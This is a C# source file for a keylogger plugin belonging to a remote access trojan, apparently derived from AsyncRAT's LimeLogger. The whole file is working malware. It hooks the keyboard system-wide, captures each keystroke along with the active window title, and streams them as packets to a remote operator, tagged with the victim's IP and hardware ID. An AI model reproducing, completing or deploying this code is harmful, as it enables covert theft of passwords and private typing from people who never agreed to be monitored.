using PacketLib.Packet;
using Plugin;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static KeyLib.Imports;


/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Plugin/LimeLogger/LimeLogger/Packet.cs
*/

namespace KeyLib
{
    public class Hook
    {
        public static StringBuilder stolen;

        static Hook() 
        {
            stolen = new StringBuilder();   
        }

		internal static Thread keyboadThread = new Thread(KeyboardThread);
		public static void AbortHook()
		{
			try
			{
                if (ptrHook != IntPtr.Zero) 
                {
                    UnhookWindowsHookEx(ptrHook);
                }
			}
			catch { }
		}
        public static void StartHooking()
        {
            keyboadThread.Start();
        }

        private static void HookKeyboard()
		{
			callback = new LowLevelKeyboardProc(GetAllKeys);
			ptrHook = SetWindowsHookEx(13, callback, System.Diagnostics.Process.GetCurrentProcess().MainModule.BaseAddress, 0);
		}

		private static void KeyboardThread()
		{
			try
			{
				HookKeyboard();
				Application.Run();
			}
			catch { }
		}

        private static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                StringBuilder stringBuilder = new StringBuilder(nChars);
                IntPtr handle = GetForegroundWindow();
                GetWindowThreadProcessId(handle, out uint pid);
                if (GetWindowText(handle, stringBuilder, nChars) > 0)
                {
                    CurrentActiveWindowTitle = stringBuilder.ToString();
                    return CurrentActiveWindowTitle;
                }
            }
            catch (Exception)
            {
            }
            return "???";
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }


        private static IntPtr GetAllKeys(int nCode, IntPtr wp, IntPtr lp)
        {
            try
            {
                if (nCode >= 0 && wp == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lp);
                    bool capsLockPressed = (GetKeyState(0x14) & 0xffff) != 0;
                    bool shiftPressed = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                    string currentKey = KeyboardLayout((uint)vkCode);

                    if (capsLockPressed || shiftPressed)
                    {
                        currentKey = currentKey.ToUpper();
                    }
                    else
                    {
                        currentKey = currentKey.ToLower();
                    }

                    if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                        currentKey = "[" + (Keys)vkCode + "]";
                    else
                    {
                        switch (((Keys)vkCode).ToString())
                        {
                            case "Space":
                                currentKey = " ";
                                break;
                            case "Return":
                                currentKey = "[ENTER]\n";
                                break;
                            case "Escape":
                                currentKey = "[ESC]\n";
                                break;
                            case "Back":
                                currentKey = "[Back]";
                                break;
                            case "Tab":
                                currentKey = "[Tab]\n";
                                break;
                        }
                    }

                    if (!string.IsNullOrEmpty(currentKey))
                    {
                        StringBuilder sb = new StringBuilder();
                        if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                        {
                            sb.Append(currentKey);
                        }
                        else
                        {
                            sb.Append($"\n\r[{DateTime.Now.ToShortTimeString()}] [{GetActiveWindowTitle()}]");
                            sb.Append($"\n{currentKey}");
                        }
                        Launch.clientHandler.SendPacket(new KeylogPacket(sb.ToString(), Launch.baseIp, Launch.HWID));
                        //stolen.Append(sb.ToString());
                    }
                }

                else if (nCode >= 0 && wp == (IntPtr)WM_SYSKEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lp);
                    bool altPressed = (GetKeyState(0xA5) & 0x8000) != 0; //only rigth alt //(GetKeyState(0xA4) & 0x8000) != 0 || (GetKeyState(0xA5) & 0x8000) != 0;//(GetKeyState(0x12) & 0xffff) != 0;
                    string currentKey = KeyboardLayout((uint)vkCode);
                    if (altPressed)
                    {
                        if (!string.IsNullOrEmpty(currentKey))
                        {
                            StringBuilder sb = new StringBuilder();
                            if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                            {
                                sb.Append(currentKey);
                            }
                            else
                            {
                                sb.Append($"\n\r[{DateTime.Now.ToShortTimeString()}] [{GetActiveWindowTitle()}]");
                                sb.Append($"\n{currentKey}");
                            }
                            Launch.clientHandler.SendPacket(new KeylogPacket(sb.ToString(), Launch.baseIp , Launch.HWID));
                            //stolen.Append(sb.ToString());
                        }
                    }

                }
                return CallNextHookEx(ptrHook, nCode, wp, lp);
            }
            catch
            {
                return IntPtr.Zero;
            }
        }

    }
}
